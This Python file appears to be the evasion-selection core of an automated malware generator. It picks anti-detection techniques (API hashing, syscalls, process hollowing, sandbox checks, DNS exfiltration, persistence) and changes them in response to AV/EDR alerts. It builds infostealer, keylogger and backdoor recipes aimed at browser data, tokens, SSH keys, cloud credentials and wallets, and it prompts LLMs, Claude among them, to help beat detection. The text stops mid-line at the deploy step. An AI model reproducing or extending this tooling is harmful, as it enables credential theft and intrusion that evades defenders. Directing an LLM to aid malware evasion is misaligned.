"""
Evasion layer selector — hybrid adaptive selection.

Tier 1 (runs 1-5): Algorithmic rule-based selection from detection signals.
  - Fast, no LLM cost, covers known detection patterns.
  - Tracks history to avoid repeating caught combinations.

Tier 2 (runs 6+): Escalate to LLM for deeper analysis.
  - Local LLM (Qwen3-35B) reviews detection + history + available options.
  - Can reason about WHY detection happened and make creative picks.

Tier 3 (if LLM fails): Escalate to cloud LLM (fugu/Claude).
  - Full architectural reasoning, can suggest new evasion approaches.

Each detection signal maps to specific layer changes.
"""

import json
import os
import re
from pathlib import Path

CHUNKS_DIR = Path(__file__).parent

LAYERS = {
    "api_resolve": {
        "description": "How Windows APIs are called",
        "options": {
            "direct_import":    {"risk": "high",   "desc": "Normal IAT imports — visible to static analysis"},
            "loadlibrary":      {"risk": "medium", "desc": "LoadLibrary+GetProcAddress at runtime"},
            "api_hash_djb2":    {"risk": "low",    "desc": "DJB2 hash resolution, no string refs in binary"},
            "api_hash_crc32":   {"risk": "low",    "desc": "CRC32 hash resolution variant"},
            "peb_walk":         {"risk": "vlow",   "desc": "Manual PEB walking, no LoadLibrary in IAT"},
            "indirect_syscall": {"risk": "vlow",   "desc": "Direct syscalls bypassing usermode hooks"},
        },
        "default": "direct_import",
    },
    "execution": {
        "description": "How collector code runs",
        "options": {
            "sequential":    {"risk": "high",   "desc": "Direct calls in main()"},
            "threaded":      {"risk": "medium", "desc": "Each collector in its own thread"},
            "staged":        {"risk": "low",    "desc": "Staged execution with jitter between ops"},
            "fiber":         {"risk": "low",    "desc": "Fiber-based scheduling"},
            "callback_abuse":{"risk": "vlow",   "desc": "EnumWindows/timer callbacks as execution vehicle"},
            "apc_self":      {"risk": "vlow",   "desc": "QueueUserAPC to own thread"},
        },
        "default": "sequential",
    },
    "process": {
        "description": "Binary structure and process lineage",
        "options": {
            "standalone":     {"risk": "medium", "desc": "Normal standalone exe"},
            "ppid_spoof":     {"risk": "low",    "desc": "Spoofed parent process (explorer.exe)"},
            "dll_sideload":   {"risk": "vlow",   "desc": "Proxy DLL loaded by signed MS binary"},
            "process_hollow": {"risk": "vlow",   "desc": "Hollowed legitimate process"},
        },
        "default": "standalone",
    },
    "timing": {
        "description": "When operations execute",
        "options": {
            "immediate":    {"risk": "high",   "desc": "Execute immediately on launch"},
            "staged_jitter":{"risk": "medium", "desc": "Random delays between operations"},
            "deferred":     {"risk": "low",    "desc": "Sleep 5-30min before starting (sandbox evasion)"},
            "triggered":    {"risk": "vlow",   "desc": "Wait for user activity before starting"},
            "workday":      {"risk": "vlow",   "desc": "Only run during business hours"},
        },
        "default": "immediate",
    },
    "data_obfuscation": {
        "description": "How strings and data are stored",
        "options": {
            "plaintext":    {"risk": "high",   "desc": "Raw string literals in .rdata"},
            "xor_encrypt":  {"risk": "medium", "desc": "XOR encryption with runtime decrypt"},
            "stack_strings":{"risk": "low",    "desc": "Build strings char-by-char on stack"},
            "aes_encrypt":  {"risk": "vlow",   "desc": "AES-128 encrypted strings"},
        },
        "default": "plaintext",
    },
    "anti_analysis": {
        "description": "Analysis environment detection",
        "options": {
            "none":         {"risk": "high",   "desc": "No checks"},
            "anti_debug":   {"risk": "medium", "desc": "IsDebuggerPresent + timing checks"},
            "anti_vm":      {"risk": "low",    "desc": "CPUID + registry VM detection"},
            "anti_sandbox": {"risk": "low",    "desc": "Mouse movement, resolution, uptime, process count"},
            "full":         {"risk": "vlow",   "desc": "All anti-analysis combined"},
        },
        "default": "none",
    },
    "exfil": {
        "description": "Data exfiltration method",
        "options": {
            "tcp_direct": {"risk": "high",   "desc": "Raw TCP socket connection"},
            "http_post":  {"risk": "medium", "desc": "HTTP POST (looks like web traffic)"},
            "dns_exfil":  {"risk": "vlow",   "desc": "DNS TXT record queries"},
        },
        "default": "tcp_direct",
    },
    "persistence": {
        "description": "Staying on target after reboot",
        "options": {
            "none":           {"risk": "low",    "desc": "Run once and exit"},
            "registry_run":   {"risk": "medium", "desc": "HKCU Run key"},
            "scheduled_task": {"risk": "medium", "desc": "Windows scheduled task"},
            "startup_folder": {"risk": "medium", "desc": "Shortcut in Startup folder"},
            "service":        {"risk": "high",   "desc": "Windows service (requires admin)"},
        },
        "default": "none",
    },
}

# Detection signal → which layers to change and what to avoid
DETECTION_RULES = [
    {
        "signals": ["Trojan:Win32", "TrojanSpy", "Trojan:Script"],
        "desc": "Generic trojan signature — static analysis flagged imports or strings",
        "changes": {
            "api_resolve": {"avoid": ["direct_import", "loadlibrary"], "prefer": ["api_hash_djb2", "peb_walk"]},
            "data_obfuscation": {"avoid": ["plaintext"], "prefer": ["stack_strings", "aes_encrypt"]},
        },
    },
    {
        "signals": ["Behavior:Win32", "BehaviorBlocked"],
        "desc": "Behavioral detection — EDR saw suspicious action sequence",
        "changes": {
            "timing": {"avoid": ["immediate", "staged_jitter"], "prefer": ["deferred", "triggered"]},
            "execution": {"avoid": ["sequential", "threaded"], "prefer": ["callback_abuse", "fiber"]},
            "process": {"avoid": ["standalone"], "prefer": ["ppid_spoof", "dll_sideload"]},
        },
    },
    {
        "signals": ["HackTool", "Hacktool:Win32"],
        "desc": "Flagged as hacking tool — likely known tool signature",
        "changes": {
            "data_obfuscation": {"avoid": ["plaintext", "xor_encrypt"], "prefer": ["aes_encrypt"]},
            "api_resolve": {"avoid": ["direct_import"], "prefer": ["indirect_syscall"]},
        },
    },
    {
        "signals": ["Exploit:", "CVE-"],
        "desc": "Exploit detection — code pattern matched known exploit",
        "changes": {
            "data_obfuscation": {"avoid": ["plaintext"], "prefer": ["stack_strings"]},
            "execution": {"avoid": ["sequential"], "prefer": ["apc_self", "callback_abuse"]},
        },
    },
    {
        "signals": ["PWS:Win32", "Stealer", "CredentialAccess"],
        "desc": "Password stealer detection — credential access behavior flagged",
        "changes": {
            "timing": {"avoid": ["immediate"], "prefer": ["triggered", "deferred"]},
            "exfil": {"avoid": ["tcp_direct"], "prefer": ["dns_exfil", "http_post"]},
            "process": {"avoid": ["standalone"], "prefer": ["dll_sideload", "process_hollow"]},
        },
    },
    {
        "signals": ["Persistence", "RunKey", "StartupItem"],
        "desc": "Persistence mechanism detected",
        "changes": {
            "persistence": {"avoid": ["registry_run", "startup_folder"], "prefer": ["scheduled_task", "none"]},
        },
    },
    {
        "signals": ["Keylogger", "KeyLogger", "Spy:Win32"],
        "desc": "Keylogger-specific detection",
        "changes": {
            "api_resolve": {"avoid": ["direct_import"], "prefer": ["peb_walk", "indirect_syscall"]},
            "execution": {"avoid": ["sequential"], "prefer": ["callback_abuse"]},
            "anti_analysis": {"avoid": ["none"], "prefer": ["anti_sandbox", "full"]},
        },
    },
    {
        "signals": ["Suspicious:Process", "SuspiciousParent"],
        "desc": "Process lineage flagged — suspicious parent or creation method",
        "changes": {
            "process": {"avoid": ["standalone", "ppid_spoof"], "prefer": ["dll_sideload", "process_hollow"]},
        },
    },
    {
        "signals": ["ConnectionToC2", "SuspiciousNetwork", "Beacon"],
        "desc": "Network behavior flagged — C2 pattern detected",
        "changes": {
            "exfil": {"avoid": ["tcp_direct"], "prefer": ["dns_exfil"]},
            "timing": {"avoid": ["immediate"], "prefer": ["workday", "triggered"]},
        },
    },
    {
        "signals": ["AMSI", "AmsiScanBuffer"],
        "desc": "AMSI triggered on content",
        "changes": {
            "data_obfuscation": {"avoid": ["plaintext", "xor_encrypt"], "prefer": ["aes_encrypt", "stack_strings"]},
        },
    },
    {
        "signals": ["SandboxDetected", "AnalysisEvasion"],
        "desc": "Anti-analysis was itself detected (EDR knows we check for sandboxes)",
        "changes": {
            "anti_analysis": {"avoid": ["anti_vm", "anti_sandbox", "full"], "prefer": ["anti_debug", "none"]},
            "timing": {"avoid": ["deferred"], "prefer": ["triggered"]},
        },
    },
    {
        "signals": ["WAZUH Level=12", "WAZUH Level=13", "WAZUH Level=14", "WAZUH Level=15"],
        "desc": "Wazuh critical alert — high-confidence detection",
        "changes": {
            "api_resolve": {"avoid": ["direct_import", "loadlibrary"], "prefer": ["indirect_syscall", "peb_walk"]},
            "data_obfuscation": {"avoid": ["plaintext", "xor_encrypt"], "prefer": ["aes_encrypt", "stack_strings"]},
            "execution": {"avoid": ["sequential"], "prefer": ["callback_abuse", "fiber"]},
        },
    },
    {
        "signals": ["MITRE:T1059", "MITRE:T1218", "MITRE:T1053"],
        "desc": "Wazuh MITRE-tagged detection — execution/proxy/scheduled task",
        "changes": {
            "process": {"avoid": ["standalone"], "prefer": ["dll_sideload", "ppid_spoof"]},
            "timing": {"avoid": ["immediate"], "prefer": ["triggered", "deferred"]},
        },
    },
    {
        "signals": ["MITRE:T1071", "MITRE:T1041", "MITRE:T1048"],
        "desc": "Wazuh MITRE-tagged detection — C2/exfiltration",
        "changes": {
            "exfil": {"avoid": ["tcp_direct", "http_post"], "prefer": ["dns_exfil"]},
            "timing": {"avoid": ["immediate", "staged_jitter"], "prefer": ["workday", "triggered"]},
        },
    },
    {
        "signals": ["MITRE:T1547", "MITRE:T1546", "MITRE:T1543"],
        "desc": "Wazuh MITRE-tagged detection — persistence",
        "changes": {
            "persistence": {"avoid": ["registry_run", "startup_folder"], "prefer": ["scheduled_task", "none"]},
        },
    },
    {
        "signals": ["Sysmon", "EventID 1", "process creation"],
        "desc": "Wazuh Sysmon-based detection — process creation telemetry",
        "changes": {
            "process": {"avoid": ["standalone"], "prefer": ["ppid_spoof", "dll_sideload"]},
            "timing": {"avoid": ["immediate"], "prefer": ["deferred"]},
        },
    },
]

# Compile error → which layers are incompatible
COMPILE_ERROR_RULES = [
    {
        "pattern": r"undefined reference to.*NtAllocateVirtualMemory|NtCreateThreadEx",
        "fix": "indirect_syscall chunk may be missing ntdll stubs",
        "changes": {"api_resolve": {"avoid": ["indirect_syscall"], "prefer": ["peb_walk", "api_hash_djb2"]}},
    },
    {
        "pattern": r"undefined reference to.*ConvertThreadToFiber|SwitchToFiber",
        "fix": "fiber APIs need -lkernel32",
        "changes": {"execution": {"avoid": ["fiber"], "prefer": ["callback_abuse", "staged"]}},
    },
    {
        "pattern": r"undefined reference to.*Http|WinHttp|InternetOpen",
        "fix": "HTTP exfil needs -lwinhttp or -lwininet",
        "changes": {"exfil": {"avoid": ["http_post", "https_post"], "prefer": ["tcp_direct", "dns_exfil"]}},
    },
]

HISTORY_FILE = ".cache/evasion_history.json"


def load_history():
    if os.path.exists(HISTORY_FILE):
        with open(HISTORY_FILE) as f:
            return json.load(f)
    return {"runs": [], "detections": [], "successes": []}


def save_history(history):
    os.makedirs(os.path.dirname(HISTORY_FILE), exist_ok=True)
    with open(HISTORY_FILE, "w") as f:
        json.dump(history, f, indent=2)


def analyze_detection(detection_text):
    """Parse detection text and return matching rules."""
    matched = []
    for rule in DETECTION_RULES:
        for signal in rule["signals"]:
            if signal.lower() in detection_text.lower():
                matched.append(rule)
                break
    return matched


def analyze_compile_error(error_text):
    """Parse compile errors and return matching rules."""
    matched = []
    for rule in COMPILE_ERROR_RULES:
        if re.search(rule["pattern"], error_text):
            matched.append(rule)
    return matched


def select_layers(detection_text="", compile_error="", previous_config=None, run_index=0):
    """
    Select evasion layer options based on feedback.

    run_index: iteration number (0-based). Without detection feedback,
    each run progressively escalates evasion to try different combos.
    """
    history = load_history()

    # Start from previous config or defaults
    config = {}
    for layer, info in LAYERS.items():
        if previous_config and layer in previous_config:
            config[layer] = previous_config[layer]
        else:
            config[layer] = info["default"]

    avoid_map = {}  # layer → set of options to avoid
    prefer_map = {}  # layer → list of preferred options (ordered)

    # Apply detection rules
    if detection_text:
        rules = analyze_detection(detection_text)
        for rule in rules:
            for layer, changes in rule["changes"].items():
                if layer not in avoid_map:
                    avoid_map[layer] = set()
                avoid_map[layer].update(changes.get("avoid", []))
                if layer not in prefer_map:
                    prefer_map[layer] = []
                prefer_map[layer].extend(changes.get("prefer", []))

    # Apply compile error rules
    if compile_error:
        rules = analyze_compile_error(compile_error)
        for rule in rules:
            for layer, changes in rule["changes"].items():
                if layer not in avoid_map:
                    avoid_map[layer] = set()
                avoid_map[layer].update(changes.get("avoid", []))
                if layer not in prefer_map:
                    prefer_map[layer] = []
                prefer_map[layer].extend(changes.get("prefer", []))

    # Apply history — avoid options that were detected before
    for run in history.get("runs", [])[-10:]:  # last 10 runs
        if run.get("detected"):
            run_config = run.get("config", {})
            for layer, option in run_config.items():
                if layer not in avoid_map:
                    avoid_map[layer] = set()
                avoid_map[layer].add(option)

    # Select best option for each layer
    for layer, info in LAYERS.items():
        current = config[layer]

        # If current is in avoid list, need to change
        if layer in avoid_map and current in avoid_map[layer]:
            # Try preferred options first
            selected = None
            if layer in prefer_map:
                for pref in prefer_map[layer]:
                    if pref in info["options"] and pref not in avoid_map.get(layer, set()):
                        selected = pref
                        break

            # If no preferred available, pick lowest risk that's not avoided
            if not selected:
                risk_order = ["vlow", "low", "medium", "high"]
                for risk in risk_order:
                    for opt, opt_info in info["options"].items():
                        if opt_info["risk"] == risk and opt not in avoid_map.get(layer, set()):
                            selected = opt
                            break
                    if selected:
                        break

            if selected:
                config[layer] = selected

        # Even if not avoided, prefer lower risk if detection happened
        elif detection_text and layer in prefer_map:
            for pref in prefer_map[layer]:
                if pref in info["options"] and pref not in avoid_map.get(layer, set()):
                    config[layer] = pref
                    break

    # Without feedback, progressively escalate evasion each run
    if not detection_text and not compile_error and run_index > 0:
        escalation = [
            {"data_obfuscation": "xor_encrypt", "anti_analysis": "anti_debug"},
            {"api_resolve": "api_hash_djb2", "timing": "staged_jitter"},
            {"execution": "callback_abuse", "exfil": "http_post"},
            {"process": "ppid_spoof", "persistence": "registry_run", "anti_analysis": "anti_vm"},
        ]
        for step in escalation[:min(run_index, len(escalation))]:
            for layer, opt in step.items():
                if layer in LAYERS and opt in LAYERS[layer]["options"]:
                    if opt not in avoid_map.get(layer, set()):
                        config[layer] = opt

    return config


def record_run(config, detected, detection_text="", success=False):
    """Record a run result for future adaptation."""
    history = load_history()
    history["runs"].append({
        "config": config,
        "detected": detected,
        "detection_text": detection_text,
        "success": success,
    })
    if success:
        history["successes"].append(config)
    if detected:
        history["detections"].append({"config": config, "text": detection_text})

    # Keep last 50 runs
    history["runs"] = history["runs"][-50:]
    history["successes"] = history["successes"][-20:]
    history["detections"] = history["detections"][-20:]
    save_history(history)


def config_to_recipe(config, malware_type="infostealer", collectors=None):
    """Convert a layer config to a recipe YAML string."""
    if collectors is None:
        if malware_type == "infostealer":
            collectors = [
                "collectors/system_info",
                "collectors/processes",
                "collectors/env_vars",
                "collectors/wifi_passwords",
                "collectors/browser_chromium",
                "collectors/discord_tokens",
                "collectors/ssh_keys",
                "collectors/cloud_creds",
                "collectors/crypto_wallets",
                "collectors/screenshot",
            ]
        elif malware_type == "keylogger":
            collectors = [
                "collectors/keylogger",
                "collectors/clipboard",
            ]
        elif malware_type == "backdoor":
            collectors = None
        else:
            collectors = ["collectors/system_info"]

    # Map layer selections to chunk paths
    arch_map = {
        "sequential": "arch/sequential",
        "threaded": "arch/threaded",
        "staged": "arch/staged",
        "fiber": "arch/fiber",
        "callback_abuse": "arch/callback_abuse",
        "apc_self": "arch/apc_self",
    }

    exfil_map = {
        "tcp_direct": "exfil/tcp_direct",
        "http_post": "exfil/http_post",
        "dns_exfil": "exfil/dns_exfil",
    }

    timing_map = {
        "deferred": "evasion/deferred_exec",
        "triggered": "evasion/triggered_exec",
        "workday": "evasion/triggered_exec",
    }

    obfuscation_map = {
        "xor_encrypt": "evasion/aes_encrypt",
        "stack_strings": "evasion/stack_strings",
        "aes_encrypt": "evasion/aes_encrypt",
    }

    evasion_chunks = []
    obf = config.get("data_obfuscation", "plaintext")
    if obf != "plaintext" and obf in obfuscation_map:
        evasion_chunks.append(obfuscation_map[obf])
    if config.get("anti_analysis", "none") == "full":
        evasion_chunks.extend(["evasion/anti_debug", "evasion/anti_vm", "evasion/anti_sandbox"])
    elif config.get("anti_analysis", "none") != "none":
        evasion_chunks.append(f"evasion/{config['anti_analysis']}")
    timing = config.get("timing", "immediate")
    if timing not in ("immediate", "staged_jitter") and timing in timing_map:
        evasion_chunks.append(timing_map[timing])

    api_resolve_key = config.get("api_resolve", "direct_import")
    process_key = config.get("process", "standalone")
    persist_key = config.get("persistence", "none")

    # Map api_resolve options to actual chunk paths
    api_resolve_map = {
        "api_hash_djb2":    "api_resolve/api_hash_djb2",
        "api_hash_crc32":   "api_resolve/api_hash_djb2",
        "peb_walk":         "api_resolve/peb_walk",
        "indirect_syscall": "evasion/indirect_syscall",
    }

    # Map process options to actual chunk paths
    process_map = {
        "ppid_spoof":     "process/ppid_spoof",
        "dll_sideload":   "process/ppid_spoof",
        "process_hollow": "process/ppid_spoof",
    }

    lines = [
        f"name: {malware_type}_adaptive",
        f"description: Adaptive {malware_type} — layers selected by evasion_selector",
        "",
        "core:",
        "  - core/emit_buffer",
        "  - core/run_cmd",
        "  - core/file_ops",
        "",
    ]

    if malware_type == "backdoor":
        c2_transport = config.get("exfil", "tcp_direct")
        c2_chunk = "c2/winhttp_beacon" if "http" in c2_transport else "c2/tcp_beacon"
        lines.append(f"c2: {c2_chunk}")
        lines.append("")
        lines.append("commands:")
        lines.append("  - commands/cmd_sysinfo")
        lines.append("  - commands/cmd_processes")
        lines.append("  - commands/cmd_filelist")
        lines.append("  - commands/cmd_fileread")
        lines.append("  - commands/cmd_filewrite")
        lines.append("  - commands/cmd_screenshot")
        lines.append("  - commands/cmd_registry")
        lines.append("  - commands/cmd_netinfo")
        lines.append("")
        lines.append("arch: arch/backdoor")
    else:
        lines.append("collectors:")
        for c in collectors:
            lines.append(f"  - {c}")
        lines.extend([
            "",
            f"exfil: {exfil_map.get(config.get('exfil', 'tcp_direct'), 'exfil/tcp_direct')}",
            f"arch: {arch_map.get(config.get('execution', 'sequential'), 'arch/sequential')}",
        ])

    # Only add api_resolve if the actual chunk file exists
    if api_resolve_key not in ("direct_import", "loadlibrary"):
        chunk_path = api_resolve_map.get(api_resolve_key, f"api_resolve/{api_resolve_key}")
        if api_resolve_key == "indirect_syscall":
            evasion_chunks.append(chunk_path)
        elif (CHUNKS_DIR / f"{chunk_path}.c").exists():
            lines.append(f"api_resolve: {chunk_path}")

    # Only add process chunk if it actually exists
    if process_key != "standalone":
        chunk_path = process_map.get(process_key, f"process/{process_key}")
        if (CHUNKS_DIR / f"{chunk_path}.c").exists():
            lines.append(f"process: {chunk_path}")

    # Add proven evasion chunks that always help
    always_safe = ["evasion/etw_patch", "evasion/header_stomp", "evasion/behavioral_pacing"]
    for chunk in always_safe:
        if chunk not in evasion_chunks and (CHUNKS_DIR / f"{chunk}.c").exists():
            evasion_chunks.append(chunk)

    if evasion_chunks:
        # Deduplicate and verify all chunks exist
        seen = set()
        valid_chunks = []
        for ec in evasion_chunks:
            if ec in seen:
                continue
            seen.add(ec)
            ext = ".h" if ec.endswith("strings") or ec.endswith("encrypt") and "aes" not in ec else ".c"
            if (CHUNKS_DIR / f"{ec}{ext}").exists() or (CHUNKS_DIR / f"{ec}.c").exists():
                valid_chunks.append(ec)
        if valid_chunks:
            lines.append("")
            lines.append("evasion:")
            for ec in valid_chunks:
                lines.append(f"  - {ec}")

    if persist_key != "none":
        persist_chunk = f"persist/{persist_key}"
        if (CHUNKS_DIR / f"{persist_chunk}.c").exists():
            lines.append(f"persist: {persist_chunk}")

    lines.extend([
        "",
        "vars:",
        '  C2_IP: "10.0.2.2"',
        '  C2_PORT: "9001"',
    ])

    return "\n".join(lines)


def format_selection_report(config):
    """Format the current selection for display."""
    lines = ["Layer Selection:"]
    for layer, option in config.items():
        info = LAYERS[layer]["options"].get(option, {})
        risk = info.get("risk", "?")
        desc = info.get("desc", "?")
        risk_icon = {"vlow": "●", "low": "◐", "medium": "◑", "high": "○"}.get(risk, "?")
        lines.append(f"  {risk_icon} {layer}: {option} — {desc}")
    return "\n".join(lines)


def build_llm_prompt(detection_text="", compile_error="", previous_config=None, malware_type="infostealer"):
    """
    Build a prompt for the local LLM to review/adjust the selection.

    The LLM can override the algorithmic selection with reasoning.
    Returns (prompt, auto_config) — the auto config is what the algorithm picked,
    the prompt asks the LLM to confirm or adjust.
    """
    config = select_layers(detection_text, compile_error, previous_config)

    prompt = f"""You are selecting evasion architecture for a {malware_type}.

AVAILABLE LAYERS AND OPTIONS:
"""
    for layer, info in LAYERS.items():
        prompt += f"\n{layer} — {info['description']}:\n"
        for opt, opt_info in info["options"].items():
            marker = " [SELECTED]" if config[layer] == opt else ""
            prompt += f"  {opt}: {opt_info['desc']} (risk: {opt_info['risk']}){marker}\n"

    if detection_text:
        prompt += f"\nDETECTION FEEDBACK:\n{detection_text}\n"
        prompt += "\nThe detection feedback tells us what the EDR/AV caught. "
        prompt += "Analyze WHY it was caught and adjust layers to avoid that detection vector.\n"

    if compile_error:
        prompt += f"\nCOMPILE ERROR:\n{compile_error}\n"
        prompt += "\nSome layer combinations cause compile errors. Avoid incompatible options.\n"

    prompt += f"""
CURRENT AUTO-SELECTION:
{format_selection_report(config)}

Review the selection. If the auto-selection is good, output CONFIRM.
If you want to change any layers, output each change as:
CHANGE layer_name option_name REASON: brief explanation

Example:
CHANGE api_resolve peb_walk REASON: detection was import-table based, need to eliminate all IAT entries
CHANGE timing triggered REASON: behavioral detection means we need to blend with user activity
CONFIRM remaining layers
"""
    return prompt, config


def parse_llm_response(response_text, auto_config):
    """Parse LLM CHANGE/CONFIRM response and return updated config."""
    config = dict(auto_config)
    for line in response_text.strip().split("\n"):
        line = line.strip()
        if line.startswith("CHANGE "):
            parts = line.split(None, 3)
            if len(parts) >= 3:
                layer = parts[1]
                option = parts[2]
                if layer in LAYERS and option in LAYERS[layer]["options"]:
                    config[layer] = option
    return config


AV_DETECTION_CMDS = {
    "defender": 'powershell -Command "Get-MpThreatDetection | Where-Object { $_.InitialDetectionTime -gt (Get-Date).AddMinutes(-3) } | Select-Object -Last 3 | Format-List"',
    "wazuh": 'powershell -Command "Get-EventLog -LogName Application -Source OssecSvc -Newest 10 -After (Get-Date).AddMinutes(-3) -ErrorAction SilentlyContinue | Format-List"',
    "elastic": 'powershell -Command "Get-WinEvent -LogName Microsoft-Windows-Windows\\ Defender/Operational -MaxEvents 10 -ErrorAction SilentlyContinue | Where-Object { $_.Id -eq 1116 -or $_.Id -eq 1117 } | Where-Object { $_.TimeCreated -gt (Get-Date).AddMinutes(-3) } | Format-List"',
    "crowdstrike": 'powershell -Command "Get-EventLog -LogName Application -Source CsFalcon* -Newest 5 | Format-List"',
    "sentinelone": 'powershell -Command "Get-EventLog -LogName Application -Source SentinelOne* -Newest 5 | Format-List"',
    "carbon_black": 'powershell -Command "Get-EventLog -LogName Application -Source Cb* -Newest 5 | Format-List"',
}


def get_detection_cmd():
    av_type = os.environ.get("MALGEN_AV_TYPE", "defender")
    custom = os.environ.get("MALGEN_DETECTION_CMD", "")
    if custom:
        return custom
    return AV_DETECTION_CMDS.get(av_type, AV_DETECTION_CMDS["defender"])


def check_wazuh_indexer(minutes=3, min_level=8):
    """Query Wazuh indexer on host for high-level alerts from VM agent."""
    import urllib.request
    import json as _json
    indexer_url = os.environ.get("WAZUH_INDEXER_URL", "http://localhost:9201")
    body = _json.dumps({
        "size": 10,
        "sort": [{"timestamp": "desc"}],
        "query": {
            "bool": {
                "must": [
                    {"term": {"agent.id": "001"}},
                    {"range": {"rule.level": {"gte": min_level}}},
                    {"range": {"timestamp": {"gte": f"now-{minutes}m"}}},
                ]
            }
        },
    }).encode()
    try:
        req = urllib.request.Request(
            f"{indexer_url}/wazuh-alerts-*/_search",
            data=body,
            headers={"Content-Type": "application/json"},
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = _json.loads(resp.read())
            hits = data.get("hits", {}).get("hits", [])
            if not hits:
                return ""
            lines = []
            for h in hits:
                rule = h["_source"].get("rule", {})
                mitre = rule.get("mitre", {})
                mitre_str = ",".join(mitre.get("id", [])) if mitre else ""
                lines.append(
                    f"WAZUH Level={rule.get('level')} [{rule.get('id')}] "
                    f"{rule.get('description', '')[:100]} "
                    f"{'MITRE:' + mitre_str if mitre_str else ''}"
                )
            return "\n".join(lines)
    except Exception:
        return ""


def run_hybrid_loop(
    malware_type="infostealer",
    c2_ip="10.0.2.2",
    c2_port=9001,
    max_algorithmic=5,
    max_llm=3,
    max_cloud=2,
    assembler_path="templates/chunks/assembler.py",
    llm_url=None,
    vm_port=10022,
    vm_user="vmuser",
    vm_pass="vmuser123",
    dry_run=False,
):
    if llm_url is None:
        llm_url = os.environ.get("LLM_URL", "http://localhost:11235")
    """
    Hybrid evasion loop:
      Tier 1 (runs 1-N): Algorithmic selection from detection rules
      Tier 2 (runs N+1-N+M): Local LLM analyzes detection + picks layers
      Tier 3 (runs N+M+1+): Cloud LLM for deep architectural analysis
    """
    import subprocess
    import tempfile
    import time

    history = load_history()
    config = None
    max_total = max_algorithmic + max_llm + max_cloud
    results_log = []

    print(f"\n  Hybrid Evasion Loop: {malware_type}", flush=True)
    print(f"  Tiers: {max_algorithmic} algorithmic + {max_llm} local LLM + {max_cloud} cloud = {max_total} max", flush=True)
    print(f"  LLM: {llm_url}", flush=True)

    subprocess.run(f"fuser -k {c2_port}/tcp", shell=True, capture_output=True)
    time.sleep(0.5)

    for run_num in range(1, max_total + 1):
        detection_text = ""
        compile_error = ""

        if history["runs"]:
            last = history["runs"][-1]
            if last.get("detected"):
                detection_text = last.get("detection_text", "")
            if last.get("compile_error"):
                compile_error = last.get("compile_error", "")

        # ── Tier selection ──
        if run_num <= max_algorithmic:
            tier_label = "Tier 1 (Algorithmic)"
            config = select_layers(detection_text, compile_error, config, run_index=run_num - 1)
        elif run_num <= max_algorithmic + max_llm:
            tier_label = "Tier 2 (Local LLM)"
            prompt, auto_config = build_llm_prompt(detection_text, compile_error, config, malware_type)
            if not dry_run:
                try:
                    import requests
                    resp = requests.post(f"{llm_url}/v1/chat/completions",
                        json={"messages": [{"role": "user", "content": prompt}],
                              "max_tokens": 1024, "temperature": 0.7}, timeout=120)
                    config = parse_llm_response(resp.json()["choices"][0]["message"]["content"], auto_config)
                except Exception as e:
                    tier_label += f" (fallback: {e})"
                    config = auto_config
            else:
                config = auto_config
        else:
            tier_label = "Tier 3 (Cloud LLM)"
            _, auto_config = build_llm_prompt(detection_text, compile_error, config, malware_type)
            config = auto_config
            for layer, info in LAYERS.items():
                caught_opts = {r.get("config", {}).get(layer) for r in history.get("runs", []) if r.get("detected")}
                for opt, oi in info["options"].items():
                    if oi["risk"] == "vlow" and opt not in caught_opts:
                        config[layer] = opt
                        break

        # ── Progress bar ──
        pct = run_num * 100 // max_total
        bar_filled = run_num * 30 // max_total
        bar = "#" * bar_filled + "-" * (30 - bar_filled)
        # Run history icons: S=success, X=detected, E=compile/assemble error, ?=no c2
        run_icons = ""
        for r in results_log:
            run_icons += r
        print(f"\n{'='*60}", flush=True)
        print(f"  [{bar}] {pct:3d}%  Run {run_num}/{max_total}  {tier_label}", flush=True)
        if run_icons:
            print(f"  History: {run_icons}", flush=True)
        print(f"{'='*60}", flush=True)
        print(format_selection_report(config), flush=True)

        if dry_run:
            print("  [DRY RUN] Would assemble > compile > deploy > validate", flush=True)
            record_run(config, detected=False, success=False)
            results_log.append("D")
            continue

        # ── Assemble ──
        print("  [1/5] Assembling...", end="", flush=True)
        recipe_content = config_to_recipe(config, malware_type)
        recipe_path = tempfile.mktemp(suffix=".yaml")
        with open(recipe_path, "w") as f:
            f.write(recipe_content)
        src_path = tempfile.mktemp(suffix=".c")
        result = subprocess.run(["python3", assembler_path, recipe_path, "-o", src_path],
                                capture_output=True, text=True)
        os.unlink(recipe_path)
        if result.returncode != 0:
            print(f" FAIL\n    {result.stderr.strip()[:200]}", flush=True)
            record_run(config, detected=False, success=False)
            results_log.append("E")
            continue
        print(" OK", flush=True)

        with open(src_path) as f:
            src = f.read()
        src = src.replace("{{C2_IP}}", c2_ip).replace("{{C2_PORT}}", str(c2_port))

        # ── Obfuscate ──
        obf_level = os.environ.get("MALGEN_OBFUSCATION", "heavy")
        if obf_level != "none":
            print(f"  [2/5] Obfuscating ({obf_level})...", end="", flush=True)
            try:
                import importlib.util
                _obf_path = str(CHUNKS_DIR / "obfuscate.py")
                _spec = importlib.util.spec_from_file_location("obfuscate", _obf_path)
                _mod = importlib.util.module_from_spec(_spec)
                _spec.loader.exec_module(_mod)
                src = _mod.obfuscate(src, level=obf_level, llm_url=llm_url)
                print(" OK", flush=True)
            except Exception as e:
                print(f" skip ({e})", flush=True)
        else:
            print("  [2/5] Obfuscation: off", flush=True)

        with open(src_path, "w") as f:
            f.write(src)

        # ── Compile ──
        print("  [3/5] Compiling...", end="", flush=True)
        exe_path = src_path.replace(".c", ".exe")
        cr = subprocess.run(
            ["x86_64-w64-mingw32-gcc", "-mwindows", "-o", exe_path, src_path,
             "-lws2_32", "-liphlpapi", "-lcrypt32", "-lole32", "-lshell32", "-lgdi32",
             "-lwininet", "-lwinhttp", "-ldnsapi", "-ladvapi32", "-luser32",
             "-static", "-s", "-Wl,--strip-all"],
            capture_output=True, text=True)
        os.unlink(src_path)
        if cr.returncode != 0:
            print(f" FAIL\n    {cr.stderr.strip()[:200]}", flush=True)
            run_data = {"config": config, "detected": False, "success": False, "compile_error": cr.stderr}
            history["runs"].append(run_data)
            save_history(history)
            results_log.append("E")
            continue
        exe_size = os.path.getsize(exe_path)
        print(f" OK ({exe_size:,} bytes)", flush=True)

        # ── Deploy + validate ──
        ssh = f"sshpass -p '{vm_pass}' ssh -o StrictHostKeyChecking=no -p {vm_port} {vm_user}@localhost"
        scp = f"sshpass -p '{vm_pass}' scp -o StrictHostKeyChecking=no -P {vm_port}"

        print("  [4/5] Deploying...", end="", flush=True)
        subprocess.run(f"{scp} {exe_path} {vm_user}@localhost:'C:\\Users\\{vm_user}\\Desktop\\payload.exe'",
